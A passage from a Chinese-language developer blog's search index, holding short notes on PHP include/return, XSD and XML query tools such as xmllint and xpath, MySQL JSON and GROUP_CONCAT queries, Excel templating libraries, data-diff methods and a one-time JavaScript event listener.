","date":"2019-09-08","objectID":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/:2:0","tags":["return"],"title":"PHP return 特別的用法小記","uri":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"include 和 return PHP: include - Manual return.php \u003c?php $var = 'PHP'; return $var; ?\u003e noreturn.php \u003c?php $var = 'PHP'; ?\u003e testreturns.php \u003c?php $foo = include 'return.php'; echo $foo; // prints 'PHP' $bar = include 'noreturn.php'; echo $bar; // prints 1 ?\u003e $bar 的值為 1 是因為 include 成功運行了。注意以上例子中的區別。第一個在被包含的文件中用了 return 而另一個沒有。如果文件不能被包含，則返回 FALSE 並發出一個 E_WARNING 警告。 如果在包含文件中定義有函數，這些函數不管是在 return 之前還是之後定義的，都可以獨立在主文件中使用。如果文件被包含兩次，PHP 5 發出致命錯誤因為函數已經被定義，但是 PHP 4 不會對在 return 之後定義的函數報錯。推薦使用 include_once 而不是檢查文件是否已包含並在包含文件中有條件返回。 ","date":"2019-09-08","objectID":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/:2:1","tags":["return"],"title":"PHP return 特別的用法小記","uri":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"include_once 和 return PHP: include_once - Manual 其實看範例很快就可以懂了 載入進去預設會為 True，假如文件有return value，include_once 就會回傳 但include_once第二次不會回傳東西 config.php \u003c?php return array(\"test\"\u003e1); //first $config = include_once(\"config.php\"); var_dump($config); $config = include_once(\"config.php\"); var_dump($config); output will be array( “test”=\u003e1, ) nothing ","date":"2019-09-08","objectID":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/:2:2","tags":["return"],"title":"PHP return 特別的用法小記","uri":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"小記 include 和 require 差別 require 和 include 的不同 require 適合用來引入靜態的內容，而 include 則適合用來引入動態的程式碼。 include 在執行時，如果 include 進來的檔案發生錯誤的話，會顯示警告，不會立刻停止； 而 require 則是會顯示錯誤，立刻終止程式，不再往下執行。 include 可以用在迴圈；require 不行。 參考來源: Syun: [PHP]include 與 require 的差別 ","date":"2019-09-08","objectID":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/:2:3","tags":["return"],"title":"PHP return 特別的用法小記","uri":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["XML"],"content":"最近看 XSD 檔案，覺得這個東西有轉成圖片來看 不過找了一些工具試試 ","date":"2019-09-07","objectID":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/:0:0","tags":["xml","xsd"],"title":"XSD 看 XML 結構一些工具","uri":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"XSD 實用工具 ","date":"2019-09-07","objectID":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/:1:0","tags":["xml","xsd"],"title":"XSD 看 XML 結構一些工具","uri":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"XSDVI 這個可以轉成圖 目前不方便測試這個 功能好像還不錯!! http://xsdvi.sourceforge.net/ipo.svg http://sourceforge.net/projects/xsdvi/ git clone 下來 ant 完會在dist 在依照範例執行可以產生 SVG 還滿簡單的 ","date":"2019-09-07","objectID":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/:1:1","tags":["xml","xsd"],"title":"XSD 看 XML 結構一些工具","uri":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"jEdit XML Plugin 沒測試 ","date":"2019-09-07","objectID":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/:1:2","tags":["xml","xsd"],"title":"XSD 看 XML 結構一些工具","uri":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"CAM editor CAM Editor 我 linux 打不開就沒測試了 ","date":"2019-09-07","objectID":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/:1:3","tags":["xml","xsd"],"title":"XSD 看 XML 結構一些工具","uri":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"XSD Diagram Dgis XSD Diagram 不知道為什麼我的 XSD 不能用在上面… ","date":"2019-09-07","objectID":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/:1:4","tags":["xml","xsd"],"title":"XSD 看 XML 結構一些工具","uri":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"Eclipse XSD Editor 可以簡單看 XML 工具 PS安裝小記: 不知道為什麼我用 apt 安裝不能打開 使用 snap 安裝 eclipse 就正常… 這個能看 XML 格式，算滿中規中矩，介面不太差 參考來源: XML Schema editors - Wikipedia ","date":"2019-09-07","objectID":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/:1:5","tags":["xml","xsd"],"title":"XSD 看 XML 結構一些工具","uri":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"QXmlEdit 最簡單實用的QXmlEdit，程式設計師你用了嗎？ - 每日頭條 QXmlEdit - simple XML editor 這個終於可以開啟我的 XML 感動 功能還算滿不錯 不知道官網抓下來檔案不能開 所以我用 snap 安裝 sudo apt install snapd # [Install qxmledit for Linux using the Snap Store | Snapcraft](https://snapcraft.io/qxmledit) sudo snap install qxmledit # 路徑在 /snap/bin/qxmledit ./snap/bin/qxmledit ","date":"2019-09-07","objectID":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/:1:6","tags":["xml","xsd"],"title":"XSD 看 XML 結構一些工具","uri":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"Visual Studio 2019 聽說 2019 有圖示介面可以看 但我不想裝大怪獸… 參考來源: xsd - How to visualize an XML schema? - Stack Overflow XML Schema editors - Wikipedia ","date":"2019-09-07","objectID":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/:1:7","tags":["xml","xsd"],"title":"XSD 看 XML 結構一些工具","uri":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"XSD 教學 XML：Schema、三种编写Schema的方式 - 熊诗言的博客 - CSDN博客 DTD與XSD的區別 - IT閱讀 ","date":"2019-09-07","objectID":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/:2:0","tags":["xml","xsd"],"title":"XSD 看 XML 結構一些工具","uri":"/blog/posts/XSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"最近做 Digital Data Exchange 介接資料 XML 平常是會用，有知道一些 Library 可以解析裡面資料 但進階的 xpath 平常沒有什麼用到 就找找看有什麼實用工具 讓未來 debug 有更快的方法 首先 Digital Data Exchange 是一個規則(XML) 因為可能會用到 xpath 在想有什麼好工具可以用? ","date":"2019-09-05","objectID":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/:0:0","tags":["xml","bash","vscode"],"title":"XML 好用的查詢工具","uri":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"XSD 首先，先講解什麼是 XSD(XML Schema D) 我以前這篇文章有提過驗證快速檢查JSON方法 | 程式狂想筆記 使用 XSD 為 XML 客製 Intellisense 輸入選單 - Yowko’s Notes XSDVi Dgis XSD Diagram 但我還沒找到好用的工具 ","date":"2019-09-05","objectID":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/:1:0","tags":["xml","bash","vscode"],"title":"XML 好用的查詢工具","uri":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"bash 指令 ","date":"2019-09-05","objectID":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/:2:0","tags":["xml","bash","vscode"],"title":"XML 好用的查詢工具","uri":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"xmllint # 安裝 sudo apt install libxml2-utils # 使用 xpath xmllint --xpath \"//*[local-name()='product_version']/*[local-name()='name']/text()\" file.xml 不過不知到為什麼公司有裝的工具不能用 可能版本太舊? 2019-09-10 有找到方法 xmllint unknown option ‘–xpath’ - Stack Overflow 結果查東西還是要用人工去掃… xmllint --shell xxxx.xml \u003c\u003c EOF '//xxx' EOF xmllint --shell xxxx.xml \u003c\u003c\u003c'xpath //xxx' for f in `find . -type f -name '*.xml'` do xmllint --shell $f \u003c\u003c\u003c'xpath //oooo/' done for f in `find . -type f -name '*.xml'` do echo $f xmllint --shell $f \u003c\u003c\u003c'xpath //oooo[.!=\"aa\" and .!=\"bbb\" and .!=\"ccc\"]/text()' done for f in *.xml do echo $f done for f in `find . -type f -name '*.xml'` do echo $f xmllint --shell $f \u003c\u003c\u003c'xpath //xxx[.=\"123456\"]/text()' done ","date":"2019-09-05","objectID":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/:2:1","tags":["xml","bash","vscode"],"title":"XML 好用的查詢工具","uri":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"xpath # 安裝 sudo apt install libxml-xpath-perl # xpath xpath -e '//book/name/text()' sample.xml ","date":"2019-09-05","objectID":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/:3:0","tags":["xml","bash","vscode"],"title":"XML 好用的查詢工具","uri":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"xml2 # 安裝 sudo apt install xml2 cat sample.xml |xml2 詳細可看: Shell解析处理XML方法汇总 備份圖 其他參考 如何使用XMLLINT和BASH解析XML文件中的命名空间 - 智库101 - 一个基于CC版权的问答分享平台 /bin/bash: xmllint: 未找到命令 - hailushijie的专栏 - CSDN博客 Shell解析处理XML方法汇总 XPath详解,总结 - 钱途无梁 - 博客园 xpath注入详解 - 渗透测试中心 - 博客园 ","date":"2019-09-05","objectID":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/:4:0","tags":["xml","bash","vscode"],"title":"XML 好用的查詢工具","uri":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"實用 vscode 套件 XML - Visual Studio Marketplace 記得要安裝 Java 要設定 home 路徑 XML Tools - Visual Studio Marketplace 可查 xpath ，算是滿方便可以查詢套件!! ","date":"2019-09-05","objectID":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/:5:0","tags":["xml","bash","vscode"],"title":"XML 好用的查詢工具","uri":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"相關 xpath 一些教學網站 因為還沒有很熟悉，之後開一篇做 xpath 筆記 XSD 可能也會記錄怎麼看，感覺認真看 XML 也是個大坑!!! XPath详解,总结 - 钱途无梁 - 博客园 xpath注入详解 - 渗透测试中心 - 博客园 Nightwatch101 #6：使用 Xpath 定位網頁元素 | Summer。桑莫。夏天 2019-10-02 xpath 可以寫這麼複雜 但要記得[]比對資料要帶\" DataReference[text()=//ShowArtist[@SequenceNumber=\"1\"]/ArtistDataReference] XPath online real-time tester, evaluator and generator for XML \u0026 HTML 爬虫进阶开发——xpath选择器常见用法 · phpspider开发文档 在 xml.value 中, XPath中使用 text() 函数的重要性 | 陈鹏个人博客 relative path ./ / //xxxx[xxxx[xxxx=sss]]=//xxxx[xxxx]/ domxpath \u003c?php $xpath = new \\DOMXpath($this-\u003exml); // 這邊 xml 是放 DOMDocument $query=\"xxxx/oooo[1]/vvvvv/ddd\"; // relative ?? // 目前看到官網也有類似相關範例 // 我的認知 Xpath 前面都要有 // or / // 這邊應該都是從 root 開始 $node = $xpath-\u003equery($query)-\u003eitem(0); $node = !empty($node) ? trim($node-\u003enodeValue) : '' ; foreach ($dates as $key =\u003e $a_node) { foreach ($a_node-\u003echildNodes as $value) { if ($value-\u003enodeName == 'xxxx') { ... 這邊注意 SimpleXML 跟 domxpath 完全沒什麼關係 我目前看法這些應該是兩個不同 Library 所以用法也不太一樣 domxpath 回傳東西很像 Javascript 的 Node 記得 domxpath 抓 看起來很不錯套件servo-php/fluidxml: FluidXML, the PHP library for manipulating XML with a concise and fluent API. ","date":"2019-09-05","objectID":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/:6:0","tags":["xml","bash","vscode"],"title":"XML 好用的查詢工具","uri":"/blog/posts/XML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7/"},{"categories":["MySQL"],"content":"最近剛好要撈出某一台 DB 特別的值 但那個欄位都是 JSON 格式 剛好那台 DB 是 MySQL 5.7.x 可以用 JSON，就趁個這個機會做筆記 -- example SELECT log-\u003e'$.uid' AS uid FROM xxx where log-\u003e'$.uid' IN ( xxxx )and time BETWEEN '2019-07-09 00:00:00' and '2019-07-09 23:59:59' -- 暫時撈資料跑報表 SELECT type,pl_id,count(1) FROM ( SELECT log-\u003e'$.uid' as uid,'2' as type,log-\u003e'$.playtrackId' AS pl_id, time FROM log_table where log-\u003e'$.uid' = 'xxxxxx' and time between '2019-07-09 00:00:00' and '2019-07-09 23:59:59' UNION ALL SELECT log-\u003e'$.uid' AS uid,'2' as type,log-\u003e'$.playtrackId' AS pl_id, time FROM log_table where log-\u003e'$.uid' = 'oooooo' and time between '2019-07-09 00:00:00' and '2019-07-09 23:59:59' UNION ALL SELECT log-\u003e'$.uid' AS uid,'2' as type,log-\u003e'$.playtrackId' AS pl_id, time FROM log_table where log-\u003e'$.uid' = 'aaaaaa' and time between '2019-07-09 00:00:00' and '2019-07-09 23:59:59' UNION ALL SELECT log-\u003e'$.uid' AS uid,'2' as type,log-\u003e'$.playtrackId' AS pl_id, time FROM log_table where log-\u003e'$.uid' = 'zzzzzz' and time between '2019-07-09 00:00:00' and '2019-07-09 23:59:59' ) aa group by type,pl_id 最後發現 JSON 字串前後會帶\" 可以用JSON_UNQUOTE MariaDB 也可以使用，不過我目前沒有用到 下方聯結有更詳細介紹 MySQL 5.7 新特性 JSON 的创建，插入，查询，更新 備份圖 MariaDB 10.0.X中，动态列支持 JSON 格式来获取数据。 -贺春旸的技术博客-51CTO博客 備份圖 之後還有用到實用的方法再補充 ","date":"2019-09-03","objectID":"/blog/posts/MySQL-MariaDB-%E6%9F%A5%E8%A9%A2-JSON-%E8%B3%87%E6%96%99%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql","mariadb","json"],"title":"MySQL / MariaDB 查詢 JSON 資料小記","uri":"/blog/posts/MySQL-MariaDB-%E6%9F%A5%E8%A9%A2-JSON-%E8%B3%87%E6%96%99%E5%B0%8F%E8%A8%98/"},{"categories":[["PHP"]],"content":"最近在工作上常常做報表(Excel) 常常用程式控制 Excel 格式 非常不方便 最近在找找有沒有用 template 好用工具 之前有找這些東西，但沒有比較好用。最近看到php-excel-templator這個，完整性感覺還滿高的。 ","date":"2019-09-03","objectID":"/blog/posts/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/:0:0","tags":["php","template"],"title":"php-excel-templator 用範本(template)快速產生Excel方法","uri":"/blog/posts/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/"},{"categories":[["PHP"]],"content":"php-excel-templator alhimik1986/php-excel-templator: PHP Spreadsheet extension to the export excel file from excel template 可以從 array 去塞一維、二維陣列 {var_name} - for string values [var_name] - for one-dimensional arrays [[var_name]] - for two-dimensional arrays 雖然這個沒有從 Excel 塞key進去，需要照 array 每個值的位子去塞 但還有對相關欄位做背景顏色設定 這部份可相對完整!! 裡面還有範例，可以算是非常好上手 ","date":"2019-09-03","objectID":"/blog/posts/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/:1:0","tags":["php","template"],"title":"php-excel-templator 用範本(template)快速產生Excel方法","uri":"/blog/posts/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/"},{"categories":[["PHP"]],"content":"其他程式 optilude/xlsx-template: A NodeJS module to generate Excel files in .xlsx format from a template created with Excel itself 這個星星數也滿高的，有針對 key 去塞 裡面也有範例檔案，但key沒對到程式就會出現錯誤 ivahaev/go-xlsx-templater: Simple xlsx template based document generator 透過MAATWEBSITE/LARAVEL-EXCEL匯出資料-EXPORT - Dustin’s murmur ","date":"2019-09-03","objectID":"/blog/posts/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/:2:0","tags":["php","template"],"title":"php-excel-templator 用範本(template)快速產生Excel方法","uri":"/blog/posts/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/"},{"categories":[["PHP"]],"content":"小記 有網路上爬到 docx 其實是一個壓縮檔，可以直接用 zip 打開，看裡面的檔案 難怪之前有一篇有用Java操作POI修改報表sample檔發生信任活頁簿問題 | 程式狂想筆記去看問題 這當中有 Open XML SDK and Excel generation from template | The ASP.NET Forums 之前有寫過類似文章 Word,Excel的相關template套件小記 | 程式狂想筆記 語言的大雜燴: [NuGet]用OpenXml在docx中套版列印 - 基本型 【雛型】Docx套版列印功能試作-黑暗執行緒 2019-09-08 發現shadz3rg/PHPStamp: The XSL-way templating library for MS Office Word DOCX documents.這個感覺不錯用套件 之前有寫過這篇Word,Excel的相關template套件小記 | 程式狂想筆記 ","date":"2019-09-03","objectID":"/blog/posts/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/:3:0","tags":["php","template"],"title":"php-excel-templator 用範本(template)快速產生Excel方法","uri":"/blog/posts/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"之前有使用 group_concat ，但沒有特別做筆記 今天剛好查報表資料，就特別來筆記 SELECT oa.id, GROUP_CONCAT(if(a.xxx_group = 0 , NULL,a.xxx_group)) AS xxx_group, CONCAT_WS(',',IF(f.a1,'a1',NULL),IF(f.a2,'a2',NULL),IF(f.a3,'a3',NULL)) AS 'a...', IF(a.xxx \u003e '' OR a.bbb \u003e '','Y','N') AS 'oo', IF(a.cc \u003e '' ,'Y','N') AS 'cc' FROM a LEFT JOIN b ON b = a.id LEFT JOIN f ON f.xxx_id = a.id ","date":"2019-09-02","objectID":"/blog/posts/group-cancat-%E5%92%8C-concat-ws-%E5%A4%9A%E5%80%8B%E6%A9%AB%E6%AC%84%E5%92%8C%E7%B8%B1%E6%AC%84%E7%B5%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E6%96%B9%E6%B3%95/:0:0","tags":["mysql"],"title":"GROUP_CONCAT 和 CONCAT_WS 多個橫欄和縱欄組在一起方法","uri":"/blog/posts/group-cancat-%E5%92%8C-concat-ws-%E5%A4%9A%E5%80%8B%E6%A9%AB%E6%AC%84%E5%92%8C%E7%B8%B1%E6%AC%84%E7%B5%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"GROUP_CONCAT 當初在 MySQL 看到這個函數有點大開眼界 因為 DB2 沒有看到類似的 function 但後來版本也有類似功能 DB2 comma separated output - Stack Overflow 簡單說明一下 GROUP_CONCAT 當初看到這個函數想說他能不能推回去(多列) 但是這不可能做到 MySQL :: MySQL 8.0 Reference Manual :: 12.20.1 Aggregate (GROUP BY) Function Descriptions 看到 GROUP_CONCAT 歸類到 GROUP FUNCTION 我覺得不太可能… GROUP_CONCAT([DISTINCT] expr [,expr ...] [ORDER BY {unsigned_integer | col_name | expr} [ASC | DESC] [,col_name ...]] [SEPARATOR str_val]) 使用搭配記得要加 GROUP BY 但不知道有兩個欄位做 GROUP_CONCAT 不知道會不會有問題 改天再實驗 ","date":"2019-09-02","objectID":"/blog/posts/group-cancat-%E5%92%8C-concat-ws-%E5%A4%9A%E5%80%8B%E6%A9%AB%E6%AC%84%E5%92%8C%E7%B8%B1%E6%AC%84%E7%B5%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E6%96%B9%E6%B3%95/:1:0","tags":["mysql"],"title":"GROUP_CONCAT 和 CONCAT_WS 多個橫欄和縱欄組在一起方法","uri":"/blog/posts/group-cancat-%E5%92%8C-concat-ws-%E5%A4%9A%E5%80%8B%E6%A9%AB%E6%AC%84%E5%92%8C%E7%B8%B1%E6%AC%84%E7%B5%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"CONCAT_WS 之前看到這個函示不知道這個用在哪裡 剛好資料要抓多欄資料合併成一欄… 我想到用CONCAT_WS 我裡面包個IF 做 null判斷是預防抓到空字串轉null動作 轉null後就不會串到,裡面 ","date":"2019-09-02","objectID":"/blog/posts/group-cancat-%E5%92%8C-concat-ws-%E5%A4%9A%E5%80%8B%E6%A9%AB%E6%AC%84%E5%92%8C%E7%B8%B1%E6%AC%84%E7%B5%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E6%96%B9%E6%B3%95/:2:0","tags":["mysql"],"title":"GROUP_CONCAT 和 CONCAT_WS 多個橫欄和縱欄組在一起方法","uri":"/blog/posts/group-cancat-%E5%92%8C-concat-ws-%E5%A4%9A%E5%80%8B%E6%A9%AB%E6%AC%84%E5%92%8C%E7%B8%B1%E6%AC%84%E7%B5%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"最近做兩個資料比較 一直常常做這件事情 不知道有沒有比較發便的做法 先說說我常用的方法 ","date":"2019-09-02","objectID":"/blog/posts/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/:0:0","tags":["csv","xlsx"],"title":"兩個資料比對方法","uri":"/blog/posts/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Visual Studio Code 比較方法 首先把一列資料貼在 Sublime F9 做排序(Excel也可以XD) 在貼到 Visual Studio Code 做 diff 動作 這方法快速簡單，但只能比對一行資料 ","date":"2019-09-02","objectID":"/blog/posts/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/:1:0","tags":["csv","xlsx"],"title":"兩個資料比對方法","uri":"/blog/posts/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Excel 大法 Excel 我不熟，有爬到一些方法 【Excel】比對雙方資料的同異處（IFERROR、VLOOKUP、IF） @ ＊YC的筆記鋪 :: 痞客邦 :: Excel應用 如何快速比對兩列數據相同點和不同點 每個人都會用到 - 每日頭條 兩份 excel 文件比對 - 文書處理 - 電腦討論區 - Mobile01 Excel內兩個sheet資料內容差異比對.. - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2019-09-02","objectID":"/blog/posts/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/:2:0","tags":["csv","xlsx"],"title":"兩個資料比對方法","uri":"/blog/posts/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"pandas 一樣不熟，有空來用用 python - Comparing two dataframes and getting the differences - Stack Overflow Python Pandas - Find difference between two data frames - Stack Overflow grades1 ","date":"2019-09-02","objectID":"/blog/posts/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/:3:0","tags":["csv","xlsx"],"title":"兩個資料比對方法","uri":"/blog/posts/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"excel-diff Diff Two Excel Files with Python | Matthew Kudija blog/content/downloads/code/excel-diff at master · mkudija/blog 爬到這篇，有現成範例程式 剛好前幾天有安裝 Jupyter Notebook (Anaconda3) 打開Notebook 裡面的 Terminal 直接執行就可以用，相對 excel-diff-3 跟 excel-diff-2 結果是相同 這個唯一需要注意 UID 需要一致 也必須是數字 excel-diff-1 新增/移除資料不會抓到，但是不需要指定 UID 樣子 這個好用工具還是有限制的 有發現好的方法持續補充 ","date":"2019-09-02","objectID":"/blog/posts/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/:3:1","tags":["csv","xlsx"],"title":"兩個資料比對方法","uri":"/blog/posts/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"今天想用 jQuery one 監聽事件 想找原生簡單使用方法 原本想 Event 直接取消監聽 但還是有爬到比較簡單的做法，簡單紀錄一下 document.querySelector('#click').addEventListener('click', function(e){ if(e.currentTarget.dataset.triggered) return; e.currentTarget.dataset.triggered = true; alert('clicked'); }) \u003cbutton id=\"click\"\u003eClick me\u003c/button\u003e 參考來源:javascript - JS equivalent for jQuery one() - Stack Overflow 